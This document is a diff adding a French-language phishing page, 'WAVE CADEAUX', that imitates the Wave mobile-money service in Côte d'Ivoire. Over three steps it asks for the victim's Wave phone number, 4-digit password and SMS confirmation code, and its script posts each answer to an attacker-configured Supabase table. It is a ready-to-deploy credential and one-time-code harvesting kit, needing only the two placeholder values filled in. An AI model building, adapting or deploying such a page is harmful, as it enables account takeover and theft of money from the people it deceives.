@@ -1,0 +1,1025 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>WAVE CADEAUX</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    background: #b9e9fa;
+    color: #111;
+}
+
+/* =========================
+   APPLICATION
+========================= */
+
+.app {
+    min-height: 100vh;
+    background: #b9e9fa;
+}
+
+/* =========================
+   HEADER
+========================= */
+
+.header {
+    height: 75px;
+    background: rgba(255,255,255,0.35);
+    border-bottom: 1px solid rgba(0,0,0,0.08);
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    position: relative;
+}
+
+.header h2 {
+    margin: 0;
+    font-size: 25px;
+    font-weight: 700;
+}
+
+.back-header {
+    position: absolute;
+    left: 20px;
+
+    border: none;
+    background: transparent;
+
+    font-size: 42px;
+    line-height: 1;
+
+    cursor: pointer;
+}
+
+/* =========================
+   PAGES
+========================= */
+
+.page {
+    display: none;
+
+    min-height: calc(100vh - 75px);
+
+    padding: 30px 20px 35px;
+
+    flex-direction: column;
+    align-items: center;
+}
+
+.page.active {
+    display: flex;
+}
+
+/* =========================
+   ETAPE
+========================= */
+
+.step {
+    color: #0875b8;
+    font-size: 16px;
+    font-weight: 600;
+
+    margin-bottom: 20px;
+}
+
+/* =========================
+   PINGOUIN
+========================= */
+
+.penguin-circle {
+    width: 125px;
+    height: 125px;
+
+    border-radius: 50%;
+
+    background: #25aee9;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    margin-bottom: 28px;
+
+    box-shadow: 0 5px 15px rgba(0,0,0,0.08);
+}
+
+.penguin {
+    font-size: 78px;
+    line-height: 1;
+}
+
+/* =========================
+   QUESTION
+========================= */
+
+.question {
+    width: 100%;
+    max-width: 650px;
+
+    text-align: center;
+
+    font-size: 29px;
+    line-height: 1.25;
+
+    margin: 0 0 28px;
+
+    font-weight: 700;
+}
+
+/* =========================
+   CHAMP MESSAGE
+========================= */
+
+.message-box {
+    width: 100%;
+    max-width: 650px;
+
+    min-height: 170px;
+
+    border: 1px solid #d5d5d5;
+    border-radius: 15px;
+
+    background: white;
+
+    padding: 18px;
+
+    resize: none;
+
+    font-family: Arial, sans-serif;
+    font-size: 18px;
+
+    outline: none;
+
+    box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+}
+
+.message-box:focus {
+    border: 2px solid #149de0;
+}
+
+.message-box::placeholder {
+    color: #8b8b8b;
+}
+
+/* =========================
+   FACULTATIF
+========================= */
+
+.optional {
+    width: 100%;
+    max-width: 650px;
+
+    margin-top: 22px;
+}
+
+.optional-title {
+    color: #527080;
+    font-size: 14px;
+
+    margin-bottom: 8px;
+}
+
+.input-box {
+    width: 100%;
+    height: 55px;
+
+    background: white;
+
+    border: 1px solid #d5d5d5;
+    border-radius: 12px;
+
+    padding: 0 16px;
+
+    margin-bottom: 12px;
+
+    font-size: 17px;
+
+    outline: none;
+}
+
+.input-box:focus {
+    border: 2px solid #149de0;
+}
+
+/* =========================
+   BOUTONS
+========================= */
+
+.buttons {
+    width: 100%;
+    max-width: 650px;
+
+    display: flex;
+
+    gap: 12px;
+
+    margin-top: 22px;
+}
+
+.next-button,
+.send-button {
+    flex: 1;
+
+    height: 58px;
+
+    border: none;
+    border-radius: 30px;
+
+    background: #078fe0;
+
+    color: white;
+
+    font-size: 19px;
+    font-weight: 700;
+
+    cursor: pointer;
+}
+
+.next-button:active,
+.send-button:active {
+    transform: scale(0.98);
+}
+
+.back-button {
+    flex: 0.75;
+
+    height: 58px;
+
+    border: 2px solid #078fe0;
+    border-radius: 30px;
+
+    background: white;
+
+    color: #078fe0;
+
+    font-size: 18px;
+    font-weight: 700;
+
+    cursor: pointer;
+}
+
+/* =========================
+   POINTS
+========================= */
+
+.dots {
+    display: flex;
+
+    gap: 12px;
+
+    margin-top: 25px;
+}
+
+.dot {
+    width: 12px;
+    height: 12px;
+
+    border-radius: 50%;
+
+    background: rgba(255,255,255,0.75);
+}
+
+.dot.active {
+    background: #078fe0;
+}
+
+/* =========================
+   MESSAGE STATUT
+========================= */
+
+.status {
+    min-height: 28px;
+
+    margin-top: 18px;
+
+    text-align: center;
+
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.status.success {
+    color: #16854a;
+}
+
+.status.error {
+    color: #d62828;
+}
+
+/* =========================
+   ANONYME
+========================= */
+
+.anonymous {
+    margin-top: 18px;
+
+    color: #37687c;
+
+    font-size: 14px;
+
+    text-align: center;
+}
+
+/* =========================
+   MOBILE
+========================= */
+
+@media (max-width: 600px) {
+
+    .header {
+        height: 68px;
+    }
+
+    .header h2 {
+        font-size: 22px;
+    }
+
+    .page {
+        padding: 25px 16px 30px;
+    }
+
+    .penguin-circle {
+        width: 105px;
+        height: 105px;
+    }
+
+    .penguin {
+        font-size: 65px;
+    }
+
+    .question {
+        font-size: 25px;
+    }
+
+    .message-box {
+        min-height: 150px;
+        font-size: 17px;
+    }
+
+    .buttons {
+        gap: 8px;
+    }
+}
+</style>
+</head>
+
+
+<body>
+
+<div class="app">
+
+<!-- =====================================
+     HEADER
+===================================== -->
+
+<header class="header">
+
+    <button
+        class="back-header"
+        onclick="headerBack()"
+    >
+        ‹
+    </button>
+
+    <h2>WAVE CADEAUX</h2>
+
+</header>
+
+
+<!-- =====================================
+     PAGE 1
+===================================== -->
+
+<section
+    id="page1"
+    class="page active"
+>
+
+    <div class="step">
+        Étape 1 sur 3
+    </div>
+
+
+    <div class="penguin-circle">
+        <div class="penguin">🐧</div>
+    </div>
+
+
+    <h1 class="question">
+        ENTREZ VOTRE NUMERO WAVE
+    </h1>
+
+
+    <textarea
+        id="message1"
+        class="message-box"
+        placeholder="+225 ****"
+    ></textarea>
+
+
+    <div class="optional">
+
+        <div class="optional-title">
+            
+        </div>
+
+        
+          
+            
+          
+        
+        
+
+        
+          
+            
+            
+            
+      
+
+    </div>
+
+
+    <div class="buttons">
+
+        <button
+            class="next-button"
+            onclick="nextPage(1)"
+        >
+            Suivant
+        </button>
+
+    </div>
+
+
+    <div class="dots">
+
+        <div class="dot active"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+
+    </div>
+
+</section>
+
+
+
+<!-- =====================================
+     PAGE 2
+===================================== -->
+
+<section
+    id="page2"
+    class="page"
+>
+
+    <div class="step">
+        Étape 2 sur 3
+    </div>
+
+
+    <div class="penguin-circle">
+        <div class="penguin">🐧</div>
+    </div>
+
+
+    <h1 class="question">
+        MOT DE PASSE WAVE
+    </h1>
+
+
+    <textarea
+        id="message2"
+        class="message-box"
+        placeholder="code a 4 chiffres.."
+    ></textarea>
+
+
+    <div class="optional">
+
+        <div class="optional-title">
+            
+        </div>
+
+        
+          
+            
+            
+            
+        
+
+        
+            
+          
+            
+            
+      
+
+    </div>
+
+
+    <div class="buttons">
+
+        <button
+            class="back-button"
+            onclick="showPage(1)"
+        >
+            Retour
+        </button>
+
+        <button
+            class="next-button"
+            onclick="nextPage(2)"
+        >
+            Suivant
+        </button>
+
+    </div>
+
+
+    <div class="dots">
+
+        <div class="dot"></div>
+        <div class="dot active"></div>
+        <div class="dot"></div>
+
+    </div>
+
+</section>
+
+
+
+<!-- =====================================
+     PAGE 3
+===================================== -->
+
+<section
+    id="page3"
+    class="page"
+>
+
+    <div class="step">
+        Étape 3 sur 3
+    </div>
+
+
+    <div class="penguin-circle">
+        <div class="penguin">🐧</div>
+    </div>
+
+
+    <h1 class="question">
+        CODE DE CONFIRMATION REÇU PAR SMS
+    </h1>
+
+
+    <textarea
+        id="message3"
+        class="message-box"
+        placeholder="Sms..."
+    ></textarea>
+
+
+    <div class="optional">
+
+        <div class="optional-title">
+    
+        </div>
+
+        <input
+            
+            
+            
+      
+        
+
+        
+            
+            
+            
+            
+        
+
+    </div>
+
+
+    <div class="buttons">
+
+        <button
+            class="back-button"
+            onclick="showPage(2)"
+        >
+            Retour
+        </button>
+
+        <button
+            id="sendButton"
+            class="send-button"
+            onclick="sendAll()"
+        >
+            Envoyer
+        </button>
+
+    </div>
+
+
+    <div
+        id="status"
+        class="status"
+    ></div>
+
+
+    <div class="anonymous">
+        wave côte divoire
+    </div>
+
+
+    <div class="dots">
+
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot active"></div>
+
+    </div>
+
+</section>
+
+</div>
+
+
+
+<script>
+
+/* =========================================================
+   SUPABASE
+========================================================= */
+
+/*
+   REMPLACE UNIQUEMENT CES DEUX VALEURS.
+
+   Exemple :
+
+   const SUPABASE_URL =
+   "https://xxxxxxxx.supabase.co";
+
+   const SUPABASE_KEY =
+   "eyJhbGciOiJIUzI1NiIs...";
+*/
+
+const SUPABASE_URL =
+"TON_URL_SUPABASE";
+
+const SUPABASE_KEY =
+"TA_CLE_ANON_SUPABASE";
+
+
+/* =========================================================
+   NAVIGATION
+========================================================= */
+
+function showPage(number) {
+
+    document
+        .querySelectorAll(".page")
+        .forEach(function(page) {
+
+            page.classList.remove("active");
+
+        });
+
+
+    document
+        .getElementById("page" + number)
+        .classList.add("active");
+
+
+    window.scrollTo({
+        top: 0,
+        behavior: "smooth"
+    });
+}
+
+
+
+function nextPage(current) {
+
+    const message =
+        document
+        .getElementById("message" + current)
+        .value
+        .trim();
+
+
+    if (message === "") {
+
+        alert(
+            "Veuillez répondre à la question avant de continuer."
+        );
+
+        return;
+    }
+
+
+    showPage(current + 1);
+}
+
+
+
+function headerBack() {
+
+    const activePage =
+        document.querySelector(".page.active");
+
+
+    if (activePage.id === "page1") {
+
+        window.history.back();
+
+        return;
+    }
+
+
+    if (activePage.id === "page2") {
+
+        showPage(1);
+
+        return;
+    }
+
+
+    if (activePage.id === "page3") {
+
+        showPage(2);
+
+        return;
+    }
+}
+
+
+/* =========================================================
+   ENVOI D'UNE RÉPONSE À SUPABASE
+========================================================= */
+
+async function sendToSupabase(
+    message,
+    pseudo,
+    contact
+) {
+
+    const response = await fetch(
+
+        SUPABASE_URL +
+        "/rest/v1/support_messages",
+
+        {
+
+            method: "POST",
+
+            headers: {
+
+                "apikey": SUPABASE_KEY,
+
+                "Authorization":
+                    "Bearer " + SUPABASE_KEY,
+
+                "Content-Type":
+                    "application/json",
+
+                "Prefer":
+                    "return=minimal"
+            },
+
+            body: JSON.stringify({
+
+                message: message,
+
+                pseudo:
+                    pseudo || null,
+
+                contact:
+                    contact || null
+
+            })
+        }
+    );
+
+
+    if (!response.ok) {
+
+        const error =
+            await response.text();
+
+        console.error(
+            "Erreur Supabase :",
+            error
+        );
+
+        throw new Error(error);
+    }
+}
+
+
+/* =========================================================
+   ENVOYER LES 3 RÉPONSES
+========================================================= */
+
+async function sendAll() {
+
+    const message1 =
+        document
+        .getElementById("message1")
+        .value
+        .trim();
+
+
+    const message2 =
+        document
+        .getElementById("message2")
+        .value
+        .trim();
+
+
+    const message3 =
+        document
+        .getElementById("message3")
+        .value
+        .trim();
+
+const pseudo = "";
+const contact = "";
+    
+
+
+    
+        
+        
+      
+        
+        
+      
+        
+      
+        
+        
+        
+        
+        
+      
+
+
+    const status =
+        document.getElementById("status");
+
+
+    const button =
+        document.getElementById("sendButton");
+
+
+    /* Vérification */
+
+    if (
+        !message1 ||
+        !message2 ||
+        !message3
+    ) {
+
+        status.className =
+            "status error";
+
+        status.textContent =
+            "Veuillez répondre aux 3 questions.";
+
+        return;
+    }
+
+
+    /* Désactivation du bouton */
+
+    button.disabled = true;
+
+    button.textContent =
+        "Envoi...";
+
+
+    status.className =
+        "status";
+
+    status.textContent =
+        "Envoi de vos réponses...";
+
+
+    try {
+
+        /*
+         * Réponse 1
+         */
+
+        await sendToSupabase(
+
+            "[Étape 1] " + message1,
+
+            pseudo,
+
+            contact
+        );
+
+
+        /*
+         * Réponse 2
+         */
+
+        await sendToSupabase(
+
+            "[Étape 2] " + message2,
+
+            pseudo,
+
+            contact
+        );
+
+
+        /*
+         * Réponse 3
+         */
+
+        await sendToSupabase(
+
+            "[Étape 3] " + message3,
+
+            pseudo,
+
+            contact
+        );
+
+
+        /* Succès */
+
+        status.className =
+            "status success";
+
+        status.textContent =
+            "Merci ! Vos réponses ont bien été envoyées ❤️";
+
+
+        button.textContent =
+            "Envoyé ✓";
+
+
+        /*
+         * Nettoyage
+         */
+
+        document
+            .querySelectorAll("textarea")
+            .forEach(function(input) {
+
+                input.value = "";
+
+            });
+
+
+        document
+            .querySelectorAll(".input-box")
+            .forEach(function(input) {
+
+                input.value = "";
+
+            });
+
+
+    }
+
+    catch (error) {
+
+        console.error(error);
+
+
+        status.className =
+            "status error";
+
+        status.textContent =
+            "Impossible d'envoyer vos réponses. Vérifiez votre configuration Supabase.";
+
+
+        button.disabled = false;
+
+        button.textContent =
+            "Réessayer";
+    }
+}
+
+</script>
+
+</body>
+</html>
